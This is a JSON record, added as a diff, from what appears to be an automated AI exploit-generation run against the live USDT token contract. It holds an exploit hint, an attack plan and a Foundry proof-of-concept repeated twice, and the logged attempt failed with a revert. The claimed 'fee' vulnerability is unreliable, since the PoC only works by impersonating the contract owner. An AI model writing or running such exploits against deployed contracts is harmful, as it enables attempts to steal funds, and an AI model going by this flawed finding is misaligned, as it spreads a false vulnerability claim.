@@ -1,0 +1,72 @@
+{
+  "project_id": "2022-10-shimacapital-ondo-securityreview",
+  "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  "finding_id": 17,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "vulnerability_type": "ERC20 Non-conformity",
+    "violation_category": "ECONOMIC",
+    "finding_id": 17,
+    "preconditions": [
+      {
+        "type": "token_balance",
+        "description": "Attacker must have some balance of the target token to initiate transfer",
+        "token_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        "min_amount": "1"
+      },
+      {
+        "type": "state",
+        "description": "Contract must not be paused (paused == false)",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "state",
+        "description": "Attacker must not be blacklisted (isBlackListed[attacker] == false)",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        "victim_contract": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "The contract's transfer function has a fee calculation bug where it subtracts the full _value from sender's balance but only adds (value - fee) to recipient. This creates an inconsistency. Exploit by: 1. Ensure contract is not paused and you're not blacklisted. 2. Call transfer() with a value that triggers fee calculation (basisPointsRate > 0). 3. The fee will be minted to owner but the total supply doesn't increase accordingly, creating potential for balance inflation if owner transfers fees to attacker."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface TetherToken {\n    function owner() external view returns (address);\n    function balanceOf(address who) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function transfer(address _to, uint256 _value) external;\n    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;\n    function paused() external view returns (bool);\n    function isBlackListed(address _maker) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n    address owner; // Declare owner as a state variable\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Setup: Get owner address and ensure contract is not paused\n        owner = TetherToken(TARGET).owner(); // Assign to state variable\n        vm.label(owner, \"Contract Owner\");\n        \n        // Give attacker some initial tokens\n        deal(TARGET, attacker, 1000 * 10**6); // USDT has 6 decimals\n        \n        // Ensure contract is not paused - we'll assume it's not\n        // Ensure attacker is not blacklisted - we'll assume not\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));\n        // Step 1: Impersonate owner to set fee parameters\n        vm.startPrank(owner);\n        TetherToken(TARGET).setParams(100, 10); // 1% fee, max 10 tokens\n        vm.stopPrank();\n        \n        // Record initial balances\n        uint256 initialAttackerBalance = TetherToken(TARGET).balanceOf(attacker);\n        uint256 initialOwnerBalance = TetherToken(TARGET).balanceOf(owner);\n        uint256 initialTotalSupply = TetherToken(TARGET).totalSupply();\n        \n        console.log(\"Initial attacker balance:\", initialAttackerBalance);\n        console.log(\"Initial owner balance:\", initialOwnerBalance);\n        console.log(\"Initial total supply:\", initialTotalSupply);\n        \n        // Step 2: Make a transfer to generate fees\n        // Transfer 100 tokens (with 6 decimals)\n        uint256 transferAmount = 100 * 10**6;\n        TetherToken(TARGET).transfer(address(0x123), transferAmount);\n        \n        // Calculate expected fee: 1% of 100 = 1 token (capped at max fee of 10)\n        uint256 expectedFee = 1 * 10**6;\n        \n        // Step 3: Check owner received the fee\n        uint256 newOwnerBalance = TetherToken(TARGET).balanceOf(owner);\n        uint256 ownerBalanceIncrease = newOwnerBalance - initialOwnerBalance;\n        console.log(\"Owner balance increase (fee collected):\", ownerBalanceIncrease);\n        require(ownerBalanceIncrease == expectedFee, \"Owner should have received fee\");\n        \n        // Step 4: Owner transfers collected fee to attacker\n        vm.prank(owner);\n        TetherToken(TARGET).transfer(attacker, ownerBalanceIncrease);\n        \n        // Step 5: Verify attacker's balance increased\n        uint256 finalAttackerBalance = TetherToken(TARGET).balanceOf(attacker);\n        uint256 finalTotalSupply = TetherToken(TARGET).totalSupply();\n        \n        console.log(\"Final attacker balance:\", finalAttackerBalance);\n        console.log(\"Final total supply:\", finalTotalSupply);\n        console.log(\"Attacker profit:\", finalAttackerBalance - initialAttackerBalance);\n        \n        // The vulnerability: total supply didn't change but attacker got tokens\n        require(finalTotalSupply == initialTotalSupply, \"Total supply should not change\");\n        require(finalAttackerBalance > initialAttackerBalance, \"Attacker balance should increase\");\n        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The TetherToken contract has a fee mechanism where transfer() charges a fee that goes to the owner. However, when fees are collected, the _totalSupply variable is not updated to reflect the movement of tokens from users to owner. This creates an ERC20 non-conformity where totalSupply() doesn't match the actual sum of all balances. The exploit hint suggests we can profit if the owner transfers collected fees to the attacker, giving us tokens that aren't accounted for in totalSupply.",
+      "attack_strategy": "1. Ensure contract is not paused and attacker is not blacklisted. 2. Check if basisPointsRate > 0 (or set it by impersonating owner). 3. Make a transfer to generate fees for owner. 4. Have owner transfer collected fees to attacker. 5. Attacker's balance increases with tokens that aren't reflected in totalSupply.",
+      "step_by_step_plan": "1. Use vm.prank() to impersonate owner and set fee parameters. 2. Use deal() to give attacker initial token balance. 3. Call transfer() to generate fees. 4. Impersonate owner again to transfer collected fees to attacker. 5. Verify attacker's balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface TetherToken {\n    function owner() external view returns (address);\n    function balanceOf(address who) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function transfer(address _to, uint256 _value) external;\n    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;\n    function paused() external view returns (bool);\n    function isBlackListed(address _maker) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n    address owner; // Declare owner as a state variable\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Setup: Get owner address and ensure contract is not paused\n        owner = TetherToken(TARGET).owner(); // Assign to state variable\n        vm.label(owner, \"Contract Owner\");\n        \n        // Give attacker some initial tokens\n        deal(TARGET, attacker, 1000 * 10**6); // USDT has 6 decimals\n        \n        // Ensure contract is not paused - we'll assume it's not\n        // Ensure attacker is not blacklisted - we'll assume not\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));\n        // Step 1: Impersonate owner to set fee parameters\n        vm.startPrank(owner);\n        TetherToken(TARGET).setParams(100, 10); // 1% fee, max 10 tokens\n        vm.stopPrank();\n        \n        // Record initial balances\n        uint256 initialAttackerBalance = TetherToken(TARGET).balanceOf(attacker);\n        uint256 initialOwnerBalance = TetherToken(TARGET).balanceOf(owner);\n        uint256 initialTotalSupply = TetherToken(TARGET).totalSupply();\n        \n        console.log(\"Initial attacker balance:\", initialAttackerBalance);\n        console.log(\"Initial owner balance:\", initialOwnerBalance);\n        console.log(\"Initial total supply:\", initialTotalSupply);\n        \n        // Step 2: Make a transfer to generate fees\n        // Transfer 100 tokens (with 6 decimals)\n        uint256 transferAmount = 100 * 10**6;\n        TetherToken(TARGET).transfer(address(0x123), transferAmount);\n        \n        // Calculate expected fee: 1% of 100 = 1 token (capped at max fee of 10)\n        uint256 expectedFee = 1 * 10**6;\n        \n        // Step 3: Check owner received the fee\n        uint256 newOwnerBalance = TetherToken(TARGET).balanceOf(owner);\n        uint256 ownerBalanceIncrease = newOwnerBalance - initialOwnerBalance;\n        console.log(\"Owner balance increase (fee collected):\", ownerBalanceIncrease);\n        require(ownerBalanceIncrease == expectedFee, \"Owner should have received fee\");\n        \n        // Step 4: Owner transfers collected fee to attacker\n        vm.prank(owner);\n        TetherToken(TARGET).transfer(attacker, ownerBalanceIncrease);\n        \n        // Step 5: Verify attacker's balance increased\n        uint256 finalAttackerBalance = TetherToken(TARGET).balanceOf(attacker);\n        uint256 finalTotalSupply = TetherToken(TARGET).totalSupply();\n        \n        console.log(\"Final attacker balance:\", finalAttackerBalance);\n        console.log(\"Final total supply:\", finalTotalSupply);\n        console.log(\"Attacker profit:\", finalAttackerBalance - initialAttackerBalance);\n        \n        // The vulnerability: total supply didn't change but attacker got tokens\n        require(finalTotalSupply == initialTotalSupply, \"Total supply should not change\");\n        require(finalAttackerBalance > initialAttackerBalance, \"Attacker balance should increase\");\n        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "] testExploit() (gas: 16367)",
+        "location": null,
+        "raw_snippet": "\n👉 [Revert Occurred Here]: ] testExploit() (gas: 16367)"
+      },
+      "feedback": "EVM Revert: ] testExploit() (gas: 16367)。请调整参数或调用路径。",
+      "duration_seconds": 76.87163019180298,
+      "prompt_tokens": 8794,
+      "completion_tokens": 3497,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 76.8746829032898,
+  "total_prompt_tokens": 8794,
+  "total_completion_tokens": 3497,
+  "total_cost": 0.0
+}
